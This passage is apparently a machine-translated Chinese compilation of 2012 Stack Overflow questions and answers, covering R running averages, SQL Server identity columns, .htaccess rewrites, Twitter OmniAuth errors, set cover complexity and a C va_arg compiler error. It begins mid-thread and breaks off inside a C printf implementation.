这只是我认为解决方案*可能*需要的概要。为简单起见，我将`plyr`仅用于说明所需的步骤。

让我们只限于**一个学生**的情况。如果我们可以为一个学生计算这个，那么通过某种拆分应用来扩展它将是微不足道的。

所以让我们假设我们有一个特定学生的分数，按课程结束日期排序：

```
d <- sample(seq(as.Date("2011-01-01"),as.Date("2011-01-31"),by = 1),100,replace = TRUE)
dat <- data.frame(date = sort(d),val = rnorm(100)) 
```

首先，我认为您需要按日期对此进行总结，然后计算累积运行平均值：

```
dat_sum <- ddply(dat,.(date),summarise,valsum = sum(val),n = length(val))
dat_sum$mn <- with(dat_sum,cumsum(valsum) / cumsum(n)) 
```

最后，您将这些值合并回具有重复日期的原始数据：

```
dat_merge <- merge(dat,dat_sum[,c("date","mn")]) 
```

我可能可以使用匿名函数在**data.table**中编写一些执行此操作的内容来执行所有这些步骤，但我怀疑其他人可能能够更好地执行简洁快速的操作。（特别是，我不建议实际使用**plyr**来解决这个问题，因为我怀疑它仍然会非常慢。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-03T01:03:14.803

我认为这样的事情应该可以工作，尽管每个用户拥有多个课程的测试数据会很有帮助。还可能需要在 findInterval 中的开始日期 +1 以使条件为 End.Date < Start.Date 而不是 <=。

```
# in the test data, one is POSIXct and the other a factor
data$Course.Start.Date = as.Date(data$Course.Start.Date)
data$Course.End.Date = as.Date(data$Course.End.Date)
data = data[order(data$Course.End.Date), ]
data$Mean.Prior.Score = ave(seq_along(data$User.ID), data$User.ID, FUN=function(i)
    c(NA, cumsum(data$Score[i]) / seq_along(i))[1L + findInterval(data$Course.Start.Date[i], data$Course.End.Date[i])]) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-03T02:20:41.610

拥有 300 万行数据，也许数据库会有所帮助。这是一个 sqlite 示例，我相信它会创建类似于您的`for`循环的内容：

```
# data.frame for testing
user <- sample.int(10000, 100)
course <- sample.int(10000, 100)
c_start <- sample(
  seq(as.Date("2004-01-01"), by="3 months", length.ou=12), 
  100, replace=TRUE
)
c_end <- c_start + as.difftime(11, units="weeks")
c_idx <- sample.int(100, 1000, replace=TRUE)
enroll <- data.frame(
  user=sample(user, 1000, replace=TRUE), 
  course=course[c_idx], 
  c_start=as.character(c_start[c_idx]), 
  c_end=as.character(c_end[c_idx]), 
  score=runif(1000),
  stringsAsFactors=FALSE
)

#variant 1: for-loop
system.time({
enroll$avg.p.score <- NA
for (i in 1:nrow(enroll)) {
  sum <- 0
  count <- 0
  for (j in which(enroll$user==enroll$user[[i]])) 
    if (enroll$c_end[[j]] < enroll$c_start[[i]]) {
      sum <- sum + enroll$score[[j]]
      count <- count + 1
    }
  if(count !=0) enroll$avg.p.score[[i]] <- sum / count
} 
})

#variant 2: sqlite
system.time({
library(RSQLite)
con <- dbConnect("SQLite", ":memory:")
dbWriteTable(con, "enroll", enroll, overwrite=TRUE)

sql <- paste("Select e.user, e.course, Avg(p.score)",
             "from enroll as e",
             "cross join enroll as p", 
             "where e.user=p.user and p.c_end < e.c_start",
             "group by e.user, e.course;")
res <- dbSendQuery(con, sql)
dat <- fetch(res, n=-1)
}) 
```

在我的机器上，sqlite 快十倍。如果这还不够，还可以索引数据库。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-03T02:53:25.037

我无法真正测试这一点，因为您的数据似乎不满足任何组合的不等式，但我会尝试这样的事情：

```
library(plyr)
res <- ddply(data, .(User.ID), function(d) {
   with(subset(merge(d, d, by=NULL, suffixes=c(".i", ".j")),
               Course.End.Date.j < Course.Start.Date.i),
        c(Mean.Prior.Score = mean(Score.j)))
})
res$Mean.Prior.Score[is.nan(res$Mean.Prior.Score)] = 0 
```

下面是它的工作原理：

*   **ddply：**对数据进行分组`User.ID`并为每个`d`行子集执行函数`User.ID`
*   **合并：**为一个用户创建两个数据副本，一个以列为后缀`.i`，另一个`.j`
*   **子集：**从此外部连接中，仅选择与给定不等式匹配的那些
*   **mean：**计算匹配行的平均值
*   **c(...)：**为结果列命名
*   **res：**将是一个带有列的 data.frame`User.ID`和`Mean.Prior.Score`
*   **is.nan：** `mean`将为零长度向量返回 NaN，将它们更改为零

我想如果每个 没有太多行，这可能会相当快`User.ID`。如果这还不够快，`data.tables`其他答案中提到的可能会有所帮助。

您的代码在所需输出上有点模糊：您将其视为`data$Mean.Prior.Score`长度为一的变量，但在循环的每次迭代中都为其分配。我假设此分配仅适用于一行。您需要数据框每一行的均值，还是每个用户只需要一个均值？

# sql - 使用 Alter 命令设置主键自动递增

> ID：11786816
> 
> 赞同：0
> 
> 时间：2012-08-02T22:36:54.700
> 
> 标签：sql, sql-server-2008

> **可能重复：**
> [如何将 auto_increment 添加到 SQL Server 2008 中的列](https://stackoverflow.com/questions/6113828/how-do-i-add-auto-increment-to-a-column-in-sql-server-2008)

嘿，我在 gui 中创建了表，但是我忘记将主键设置为自动增量！表的名称是`Emp_CV`。

像这样的东西：

```
alter table Emp_CV alter column Applicant_ID NOT NULL int AUTO_INCREMENT 
```

我怎样才能做到这一点？我正在使用 SQL Server 2008！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T23:16:07.880

简短的回答是……你不能。这是你必须做的：

1.  确保没有人/没有人在使用您的桌子。

2.  添加一个新的整数列，它将成为新的标识列。它必须允许空值并且必须具有适当的标识值。

3.  执行`set identity_insert dbo.foo on`——必须指定你的表名。

4.  使用现有标识列的值播种它：

    更新 dbo.foo 设置 new_id = id

5.  删除现有标识列参与的任何键/约束。

6.  执行`set identity_insert dbo.foo off`

7.  删除现有列。

8.  更改新列，将其无效性更改为`not null`。

9.  执行命令`dbcc checkident( {your-table-name-here} , reseed )`。

10.  执行`sp_rename`并赋予新列与旧列相同的名称。

11.  重新创建在步骤 #4 中删除的键/约束。

12.  可能希望`sp_recompile`在引用此表的任何存储过程上运行。

简单的！

# data-binding - MVVM 绑定到模型或视图模型？

> ID：11786820
> 
> 赞同：1
> 
> 时间：2012-08-02T22:37:22.193
> 
> 标签：data-binding, mvvm, prism

我一直在阅读 Microsoft 的 Prism 文档，其中[对 MVVM 框架进行了冗长的讨论](http://msdn.microsoft.com/en-us/library/gg405484%28v=pandp.40%29)。讨论模型的部分和讨论视图模型的部分都讨论了视图绑定到每个声明的属性。这个对吗？在此之前我读到的所有内容都使 ViewModel 看起来像是预期的绑定源，而 Model 更多的是业务逻辑。任何澄清将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:42:38.510

几乎所有时间您都将绑定到 ViewModel，它将包装模型并添加与您的 UI 相关的便利功能（并且几乎不直接属于模型）。*有时*不需要太多便利，您最终可能会直接绑定到模型（尽管我个人选择从不这样做）。

正如您提到的那样，文档确实有点不清楚，但简而言之，您对情况的掌握是正确的。

# php - 有效的 ics 文件不是有效的 Internet 日历文件

> ID：11786822
> 
> 赞同：0
> 
> 时间：2012-08-02T22:37:38.807
> 
> 标签：php, outlook, icalendar

我编写了一个生成 ics 文件输出的 php 脚本：

> BEGIN:VCALENDAR
> PRODID:-//hacksw/handcal//NONSGML v1.0//EN
> 版本:2.0
> BEGIN:VEVENT
> DTSTAMP:20120801T000000Z
> DTSTART:20120801T000000Z
> DTEND:20120801T000000Z
> 摘要:测试组织者
> :Me
> UID:Me
> END:
> VEVCALENDAR

使用在线验证器时，该文件显示为有效：

[http://severinghaus.org/projects/icv/](http://severinghaus.org/projects/icv/)

现在这是奇怪的事情......如果我选择打开由 php 生成的文件，我会收到 MS Outlook 错误消息不是有效的 Internet 日历文件。但是，如果我从创建它的文件夹中打开它，它就会毫无问题地导入。

有没有人有任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-03T04:08:47.123

正如 josh 所指出的，它可能是不正确的标题：

例如：从 wordpress 插件生成的 ics 文件有：

```
header('Content-Type: text/calendar; charset=' . get_option('blog_charset').';');
header('Content-Disposition: attachment; filename="ical.ics"'); 
```

# css - 如何定位网页最右侧的元素，而不是浏览器页面？

> ID：11786825
> 
> 赞同：4
> 
> 时间：2012-08-02T22:38:14.507
> 
> 标签：css, position

我正在尝试将一个元素放置在网页顶部的最右侧。我最初使用的是位置：绝对。但是，在分辨率较低的计算机上测试网站后，它正确滚动了整个页面，但元素位于浏览器的右侧 - 而不是实际页面 - 所以当我向右滚动时，元素也会滚动，所以它不是直接在页面的末尾。无论如何，javascript可以解决这个问题来找到网页的宽度并将元素定位在最右边吗？谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:42:53.503

如果我正确理解问题：

```
<style>
    .stick-to-right {
        width: 250px;
        float: right;
    }
</style>
<div class="stick-to-right">Content</div> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-02T22:47:42.743

如果您在整个网页周围有一个容器/包装 DIV，则将该元素设置为 position:relative，然后将所需的 DIV 放在网页右侧，并在其上放置 position:absolute, right:0, top:0。希望有帮助。

# cakephp-2.0 - CakePHP：重命名字段名称而不更改层次结构

> ID：11786826
> 
> 赞同：0
> 
> 时间：2012-08-02T22:38:21.257
> 
> 标签：cakephp-2.0

我有这个函数写在一个 CakePHP 模型中：

```
public function getPeopleByName($name){
        $this->unbindModel(array('hasMany' => array('OfficePersonTask')));

        $options['fields'] = array("Person.id", "CONCAT(Person.first_name, ' ', Person.last_name) AS full_name");

        return $this->find('all', $options);   
} 
```

这给了我以下json：

```
{
   People:[
      {
         0:{
            full_name:"Groucho Marx"
         },
         Person:{
            id:"1"
         }
      },
      {
         0:{
            full_name:"Giovanni Ferretti"
         },
         Person:{
            id:"2"
         }
      }
   ]
} 
```

我希望 *full_name* 将成为*Person*组的一部分（实际上是在一个名为 0 的组中，独自一人）。我怎么能这样做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:48:42.350

在模型中使用虚拟字段而不是在您的查找中使用 MySQL 函数。有一些方法可以在您尝试时查询数据，但您必须考虑在索引数组中返回的数据，而不是正常的关联。

# .htaccess - 使用 htaccess 修改购物车 URL

> ID：11786827
> 
> 赞同：0
> 
> 时间：2012-08-02T22:38:27.117
> 
> 标签：.htaccess, url-rewriting, rewrite

我有一个购物车，每个产品的网址太多。每个产品可以有例如：

```
http://www.mysite.com/12345_this_is_seo_product
http://www.mysite.com/this_is_category/12345_this_is_seo_product
http://www.mysite.com/this_is_category/this_is_subcategory/12345_this_is_seo_product 
```

我想结束，`http://www.mysite.com/12345_this_is_seo_product` 所以我假设要做的事情是杀死介于 the`.com/`和 final之间的所有东西`/`。

但是，在导航类别的情况下，您可能有：

```
http://www.mysite.com/this_is_category/this_is_subcategory/ 
```

在您选择产品之前，这是可取的。

所以这意味着剥离`.com`和最终之间的所有内容`/`只能发生在产品上，唯一将产品与其他链接区分开来的是产品以数字开头的事实，如`12345_this_is_seo_product`

所以我需要的是一组表达式，它将去除`.com`和决赛之间的所有内容，`/`但只有在决赛之后`/`是一组数字（总是四个数字或更多）

希望我在没有过多解释的情况下把这一点说清楚。

## 编辑 - 添加我的 htaccess -

```
Options +FollowSymlinks

Options -Indexes

<FilesMatch "\.(tpl|ini|log)">

 Order deny,allow

 Deny from all

</FilesMatch>

RewriteEngine On

RewriteBase /

RewriteRule ^.+/([0-9]+_[^/]+)$ /$1 [R=301,L]

RewriteRule ^sitemap.xml$ index.php?route=feed/google_sitemap [L]

RewriteRule ^googlebase.xml$ index.php?route=feed/google_base [L]

RewriteCond %{REQUEST_FILENAME} !-f

RewriteCond %{REQUEST_FILENAME} !-d

RewriteCond %{REQUEST_URI} !.*\.(ico|gif|jpg|jpeg|png|js|css)

RewriteRule ^([^?]*) index.php?_route_=$1 [L,QSA] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-02T22:44:53.667

尝试将其放在文档根目录中的 htaccess 文件中的适当位置：

```
RewriteEngine On
RewriteRule ^.+/([0-9]+-[^/]+)$ /$1 [R=301,L] 
```

# twitter - 设计/OmniAuth/Twitter - OAuth::未授权 (401)

> ID：11786834
> 
> 赞同：5
> 
> 时间：2012-08-02T22:39:04.433
> 
> 标签：twitter, devise, omniauth

我正在尝试使用 Devise/OmniAuth 设置 Twitter 登录，遵循最新的 RailsCast。我已经注册了 Twitter 开发者应用，使用的回调 url: `myiphere:port/users/auth/twitter`。

我已经按照 RailsCast 上的 T 进行了所有操作，但是每次单击`Sign In With Twitter`链接时，我都会立即获得`OAuth::Unauthorized 401 Unauthorized on the myiphere:port/users/auth/twitter page`.

我想我已经使用正确定义了密钥`export TWITTER_CONSUMER_KEY=MYKEYINSERTEDHERE export TWITTWR_CONSUMER_SECRET=MYSECRETINSERTEDHERE rails server`。我已经尝试了大多数我可以在互联网上找到的解决方案，但都无济于事。几乎所有的答案都是为了在登录后返回他们的网站，我无法进入任何类型的 Twitter 屏幕，只有`/users/auth/twitter`页面上的 401 错误。

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-10-03T22:00:45.597

我有同样的问题；就我而言，我正确设置了 API 密钥，但没有在“设置”选项卡下的[https://dev.twitter.com/apps/的 Twitter 设置中设置回调 URL。](https://dev.twitter.com/apps/)

奇怪的是，回调 URL 似乎不需要指向任何有用的地方。Twitter 显然只是利用它的存在作为某种信号。

omn​​iauth-twitter 提供的调试信息有待改进。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-10T10:53:22.793

我通过从初始化程序 DEVISE.RB 中删除括号和 ENV 来使其工作：

```
config.omniauth :twitter, "APP_ID", "APP_SECRET" 
```

我在 DEV Twitter 设置中指定的回调：

```
http://www.mysite.com/users/auth/twitter/callback 
```

在路线.rb

```
devise_for :users, controllers: {omniauth_callbacks: "omniauth_callbacks"} 
```

我的登录链接：

```
<%= link_to "Log in with Twitter", user_omniauth_authorize_path(:twitter) %> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-03T07:45:16.417

在这里回答我自己的问题，似乎我只需要添加实际的键来代替`TWITTER_CONSUMER_KEY`and `TWITTER_CONSUMER_SECRET`，而不是我最初尝试添加它们的方式。我还`ENV[]`从每一个中删除了，我认为这可能会有所帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-05T21:35:26.207

您需要添加 figaro gem 才能使用视频中的环境变量。该链接将引导您完成如何设置它们。

[http://railsapps.github.io/rails-environment-variables.html](http://railsapps.github.io/rails-environment-variables.html)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-12-13T00:35:27.973

对我来说，问题是未选中“允许此应用程序用于使用 Twitter 登录”（在应用程序页面 > 设置选项卡下）

# jruby - Rails 3.2.6 reload_classes_only_on_change 在 Windows 上不起作用

> ID：11786835
> 
> 赞同：0
> 
> 时间：2012-08-02T22:39:07.497
> 
> 标签：jruby, ruby-on-rails-3.2

我正在 Windows 的开发模式下开发 rails 3.2.6 项目，我的同事正在使用 Mac。我们都使用相同的配置。对他来说页面访问速度很快，但对我来说这需要很长时间，因为它会在返回每个请求之前重新加载所有类，甚至是简单的图像 GET 请求。

在 development.rb 我们有

```
config.cache_classes = false
config.reload_classes_only_on_change = true
config.consider_all_requests_local       = true
config.action_controller.perform_caching = false 
```

如果我将其修改为以下内容，则缓存类会很快，但是当我进行更改时，我必须重新启动它们才能生效。

```
config.cache_classes = true
#config.reload_classes_only_on_change = true
config.consider_all_requests_local       = true
config.action_controller.perform_caching = false 
```

我正在使用 Rails 3.2.6、JRuby 1.7、Windows 7。有一个 rails_dev_tweaks gem 可用，但从 rails 3.2 开始，这应该不是必需的。有没有其他人见过这个问题？我是否配置错误？这个功能甚至应该在 Windows 中工作吗？

我在搜索中找不到对这个问题的任何参考，我认为 Rails 3.2.x 在 Windows 上被大量使用，所以我认为这是我做错了简单的事情。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T18:35:43.367

事实证明，这是在 Windows 上列出文件夹中所有文件的延迟。它会在添加文件的情​​况下执行此操作，以便将其添加到缓存中。

在 Mac 和 Unix 上也会发生同样的情况，只是速度要快得多，所以不那么明显

完整答案在这里：

[https://github.com/rails/rails/issues/7254](https://github.com/rails/rails/issues/7254)

# git - Git 无法推送到远程存储库：“只读文件系统”

> ID：11786838
> 
> 赞同：4
> 
> 时间：2012-08-02T22:39:10.423
> 
> 标签：git, unix, version-control, repository

尝试推送到远程存储库会给我错误：

> 错误：无法创建临时 sha1 文件名：只读文件系统

有趣的是，它在 30 分钟前的推送中运行得非常好。另一件值得注意的事情是，**我是唯一一个推送/提交/访问这个存储库**的人。

SSH 到我的存储库服务器尝试复制`chown`、`chmod`重命名等存储库，我不断收到错误`Read-only file system`。使用 yield 列出存储库的所有者`ls -ld my-repo.git`：

> drwxrwsr-x 7 my_user 用户 248 七月 20 14:56 my-repo.git/

看起来不错，归我所有，对吧？我不明白为什么会这样。任何有关如何解决这个极其烦人的问题的建议将不胜感激！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-02T22:41:25.420

您的磁盘坏了，操作系统将其重新安装为只读以保存它。请参阅 /var/log/messages 和“mount”的输出以确认。

# android - 如何使用 Tmdb API 或任何其他 API

> ID：11786851
> 
> 赞同：0
> 
> 时间：2012-08-02T22:40:39.233
> 
> 标签：android, api, imdb, themoviedb-api

我是一个新手 android 编码器。我正在编写一个练习应用程序来搜索电影名称。我制作了 XML 和 java，它有一个文本框供用户输入电影名称，但我不知道如何在互联网上搜索它！我知道我必须使用 IMDb 或 TMDb API，但我不知道如何使用它！我找到了这个网站：

[http://www.javacodegeeks.com/2010/10/android-full-app-part-2-using-http-api.html](http://www.javacodegeeks.com/2010/10/android-full-app-part-2-using-http-api.html)

但没有对代码的解释。而且我没有发现任何其他的学习。有人可以为新手如何使用 IMDb 或 TMDb API 写一个完整的解释吗？对于像我这样的新编码员来说，这将是一个很大的帮助！:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-02T22:51:51.453

您很可能会使用 HttpClient 与这些 api 进行交互。首先浏览这些示例，例如拉入 twitter 提要等。然后您将为 IMDb 的细节做好准备。所以你将不得不

1) 确定基本请求 url。也许它是 imdb.com/api（它将在文档中）。

2）您可能需要注册一个您将作为参数传递的密钥。（也在文档中）

3) 阅读文档以确定您是否要使用 get/post，因为它会影响您对参数进行编码的方式。这些参数之一可能是密钥，或者您可能不需要密钥。

4) 一般来说，你应该在写代码之前先在浏览器客户端尝试，看看返回什么。然后在处理之前在您的代码中执行相同的操作。

5）所有的http客户端都差不多，但要确定你得到了什么。is是JSON，使用simple_json来解析。是 XML，然后可能使用 SAXParser 来处理返回的内容。如果您有具体问题，请发布。我们能做的最好的就是给你一种类似这样的算法，告诉你如何去做。

这就是它的全部。只要确保你知道正确的 url，如果有一个密钥，如果通信是通过 get 或 post，如果他们使用 REST，你通常会在没有参数的情况下对 url 进行编码。然后它只是解析你得到的东西的问题。

真正的答案是一步一步来。在每个步骤中，询问您是否有问题。事实是，除非我们使用了事先没人知道的特定协议。相信我，一步一步来，你将能够处理任何 http api。

# algorithm - 找到最少数量的位序列 OR 来实现全 1？

> ID：11786856
> 
> 赞同：2
> 
> 时间：2012-08-02T22:41:25.283
> 
> 标签：algorithm, bit-manipulation, bit

我正在尝试找到任何可能对这项任务有帮助的东西：我有可变数量的位序列（它们都将具有相同的长度），并且我需要使用尽可能少的方法找到哪个序列组合将 OR 到所有 1尽可能的顺序。我正在考虑从具有最多 1 的序列开始并尝试填充空白，但由于我没有使用位比较，我真的不知道是否有一些算法或位逻辑的属性可以简化这一点。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-02T22:47:37.697

不幸的是，这个问题在最一般的情况下是 NP 难的，因为它是从**[集合覆盖问题](http://en.wikipedia.org/wiki/Set_cover_problem)**中减少的。在集合覆盖问题中，您有一组元素的集合，并且想要找到其中最小数量的集合，其并集包含所有元素。您可以通过为每个集合构造一个位向量来轻松地将集合覆盖问题简化为您的问题，如果给定集合具有该项目，则在每个位置具有 1，否则为 0。OR 为全 1 的最小数量的位向量就等价于其并集包含所有元素的最小集合组。

例如，给定集合 {a, b, e}, {b, c}, {b, d, f} 和 {a, f}，您将获得这些位向量：

```
 {a, b, e}    110010
 {b, c}       011000
 {b, d, f}    010101
 {a, f}       100001 
```

由于已知集合覆盖问题是 NP 难的，这意味着除非 P = NP，否则您的问题没有多项式时间算法。更糟糕的是，众所周知，您无法在 O(log n) 的因子内逼近最优解，其中 n 是多项式时间内的总元素数。您最好寻找启发式方法，或者使用**[贪心算法](http://en.wikipedia.org/wiki/Set_cover_problem#Greedy_algorithm)**保持 O(log n) 近似值。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-03T01:52:56.253

我想了一下这个问题，这是我想出的想法：

*   首先，您为每个位创建一个列表，并且在每个列表中，您会发现在该位上具有“1”的每个序列。这需要 O(n*m)，因为 n 是序列的数量，m 是特定序列的长度

*   然后你计算每个位序列的所有出现次数，并将所有这些 [List, Integer] 元组放入一个结构（AVL 树或堆或任何你喜欢的）中并对它们进行排序。（我的意思是：序列“a”在所有列表中出现 15 次，序列 b 出现 10 次）。这又需要 O(n*m) 因为 O(nlogn) < O(n*m)

*   在下一步中，您使用具有最高优先级的序列并删除包含此序列的第一步的所有列表。然后返回第 2 步，直到消除所有列表。在最坏的情况下，您将不得不这样做 m 次。

因此，我们总共有 O(n * m^2) 的时间，如果您误解了问题的一部分或我做错了，请纠正我；）这是我的意思的一个小例子：
位字符串：
a： 100101
b: 010001
c: 011100
d: 000010

所以这将创建列表：
L1：a
L2：b，c
L3：c
L4：a，c
L5：d
L6：a，b

然后我们将计数和排序：
a：3
c：3
b：2
d：1

所以我们在最终列表中取 a 并删除以下列表：
L1、L4、L6

现在我们再次数：
c:2
b:1
d:1

所以我们在列表中取 c 并删除：
L2, L3
所以我们只剩下 L5 只包含 d

所以我们找到了最终的最小集合：a, c, d

# c++ - 升级 NC30 M16 C 编译器：va_arg 问题

> ID：11786859
> 
> 赞同：2
> 
> 时间：2012-08-02T22:41:41.673
> 
> 标签：c++, c

在我的 NC30 M16C 编译器版本 5 中，我有以前的程序员使用的以下宏。我们在“printf()”、“sprintf()”等函数中使用这个宏。

```
typedef unsigned char * va_list;
#define va_start( args, first ) args = (va_list) ( (unsigned short) &first + sizeof( first ) )
#define va_arg( args, type ) *( (type *) args )++
#define va_end( args ) 
```

当我使用 NC30 M16C 编译器版本 6 编译此代码时，它给了我错误“无效的左值”。这是整个错误消息的一部分：

```
clib.c(253) :  C2700 (E) invalid lvalue
===>    unum = va_arg( args, unsigned int );
clib.c(293) :  C2700 (E) invalid lvalue
===>    fch = va_arg( args, far char * );
clib.c(299) :  C2700 (E) invalid lvalue
===>    nch = va_arg( args, char * );
clib.c(305) :  C2700 (E) invalid lvalue
===>    unum = va_arg( args, unsigned int );
clib.c(323) :  C2700 (E) invalid lvalue
===>    ulong = va_arg( args, unsigned long );
clib.c(341) :  C2700 (E) invalid lvalue
===>    llong = va_arg( args, unsigned long long );
clib.c(359) :  C2700 (E) invalid lvalue
===>    ulong = va_arg( args, unsigned long );
clib.c(377) :  C2700 (E) invalid lvalue
===>    unum = va_arg( args, unsigned short );
clib.c(382) :  C2700 (E) invalid lvalue
===>    ft = va_arg( args, float );
clib.c(519) :  C2694 (E) unknown variable source
===>    *source++ = zeropad ? '0' : ' ';
clib.c(527) :  C2694 (E) unknown variable source
===>    *source++ = '%';
clib.c(532) :  C2700 (E) invalid lvalue
===>    snum = va_arg( args, signed int );
clib.c(550) :  C2694 (E) unknown variable source
===>        *source++ = *tempptr;
clib.c(556) :  C2700 (E) invalid lvalue
===>    fch = va_arg( args, far char * );
clib.c(558) :  C2694 (E) unknown variable source
===>        *source++ = *fch++;
clib.c(564) :  C2700 (E) invalid lvalue
===>    nch = va_arg( args, char * );
clib.c(566) :  C2694 (E) unknown variable source
===>        *source++ = *nch++;
clib.c(572) :  C2700 (E) invalid lvalue
===>    unum = va_arg( args, unsigned int ); 
```

这是我们使用这些 micros 的功能之一。此函数与“printf”的函数相同，但将其命名为 zwPrintf()：

```
int zwPrintf( far char * format, ... ) {
    zwVAList args;
    unsigned int unum;
    unsigned char temp[ FIELD_BUFF_SIZE + 1 ];      /* for formatting numbers (max length for long decimal) */
    unsigned char * tempptr;
    int zeropad, minfield, counter;
    far char * fch;
    char * nch;
    unsigned long ulong;
    int negative;
    float ft, mantissa;
    unsigned long long llong;
    //unsigned char mychar;
    //unsigned char *mychar_p;
    //unsigned int *mytest_p;

    va_start( args, format );

    while( *format ) {
        if( *format == '%' ) {
            format++;
            zeropad = 0;
            minfield = 0;
            negative = 0;
            if( *format == '0' )
                zeropad = 1;            /* we want zero padding to field width */
            while( *format >= '0' && *format <= '9' ) {
                /* we are specifying field width */
                minfield *= 10;
                minfield += *format - '0';
                format++;
            }
            if( minfield > FIELD_BUFF_SIZE ) {      /* we want a field width greater than our field buffer, pad misc */
                for( counter = 0; counter < minfield - FIELD_BUFF_SIZE; counter++ )
                    zwPutc( (unsigned char) ( zeropad ? '0' : ' ' ) );
                minfield = FIELD_BUFF_SIZE;
            }
            switch( *format ) {
                case '%':   /* literal % */
                    zwPutc( '%' );
                break;

                case 'd':   /* signed decimal output */
                    unum = va_arg( args, unsigned int );        /* pull unsigned, and do math ourselves (to avoid confusion) */

                    //mychar='a';
                    //mychar_p = &mychar;
                    //mytest_p = ((unsigned int*)mychar_p);
                    //mytest_p++;
                    //unum = *mytest_p;
                    //unum = (*((unsigned int*)args))++;
                    //unum = (*((unsigned int*)args))++;

                    /* convert to decimal (backward) */
                    if( unum >= 0x8000 ) {      /* number is -'ve */
                        negative = 1;
                        unum = ~unum + 1;           /* make number +'ve */
                    }

                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( unum )
                            *tempptr-- = ( unum % 10 ) + '0';
                        else {
                            if( negative && ( zeropad == 0 ) ) {
                                *tempptr-- = '-';
                                negative = 0;
                            }
                            else
                                *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        }
                        unum /= 10;
                        counter++;
                    } while( unum || counter < minfield );
                    /* output the string */
                    if( negative )
                        zwPutc( '-' );
                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
                break;

                case 's':   /* far char * */
                    fch = va_arg( args, far char * );
                    while( *fch )
                        zwPutc( *fch++ );
                break;

                case 'S':   /* near char * (extension) */
                    nch = va_arg( args, char * );
                    while( *nch )
                        zwPutc( *nch++ );
                break;

                case 'x':   /* hexadecimal */
                    unum = va_arg( args, unsigned int );
                    /* convert to hexadecimal (backward) */
                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( unum )
                            *tempptr-- = zwHexToAsc( (unsigned char) unum & 0x0F );
                        else
                            *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        unum >>= 4;
                        counter++;
                    } while( unum || counter < minfield );
                    /* output the string */
                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
                break;

                case 'i':   /* unsigned long int decimal (extension) */
                    ulong = va_arg( args, unsigned long );
                    /* convert to decimal (backward) */
                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( ulong )
                            *tempptr-- = (unsigned char)( ulong % 10 ) + '0';
                        else
                            *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        ulong /= 10;
                        counter++;
                    } while( ulong || counter < minfield );
                    /* output the string */
                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
                break;

                case 'L':   /* unsigned long long decimal (extension) */
                    llong = va_arg( args, unsigned long long );
                    /* convert to decimal (backward) */
                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( llong )
                            *tempptr-- = (unsigned char)( llong % 10 ) + '0';
                        else
                            *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        llong /= 10;
                        counter++;
                    } while( llong || counter < minfield );
                    /* output the string */
                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
                break;

                case 'h':   /* unsigned long int hexadecimal (extension) */
                    ulong = va_arg( args, unsigned long );
                    /* convert to hexadecimal (backward) */
                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;
                    do {
                        if( ulong )
                            *tempptr-- = zwHexToAsc( ( (unsigned char) ulong ) & 0x0F );
                        else
                            *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        ulong >>= 4;
                        counter++;
                    } while( ulong || counter < minfield );
                    /* output the string */
                    for( tempptr++; tempptr <= &temp[ FIELD_BUFF_SIZE ]; tempptr++ )
                        zwPutc( *tempptr );
                break;

                case 'c':
                    unum = va_arg( args, unsigned short );
                    zwPutc( (char) unum );
                break;

                case 'f':
                    ft = va_arg( args, float );
#if 0
                    /* convert to decimal (backward) */
                    if( ft < 0 ) {      /* number is -'ve */
                        negative = 1;
                        ft = -ft;
                    }

                    tempptr = &temp[ FIELD_BUFF_SIZE ];
                    counter = 0;

                    /* split float to integer and mantissa part */
                    ulong = ft / 1;
                    mantissa = ft - ( float )ulong;

                    /* get integer part */
                    do {
                        if( ulong ){
                            *tempptr-- = (unsigned char)( ulong % 10 ) + '0';
                        }
                        else {
                            *tempptr-- = ( zeropad || counter == 0 ) ? '0' : ' ';
                        }
                        ulong /= 10;
                        counter++;
                    } while( ulong || counter < minfield );

                    if ( negative ) {
                        temp[ 0 ] = '-';
                        zwMemcpy( &temp[ 1 ], &temp[ FIELD_BUFF_SIZE - counter ], counter );        //change to right position
                        counter++;
                    }
                    else
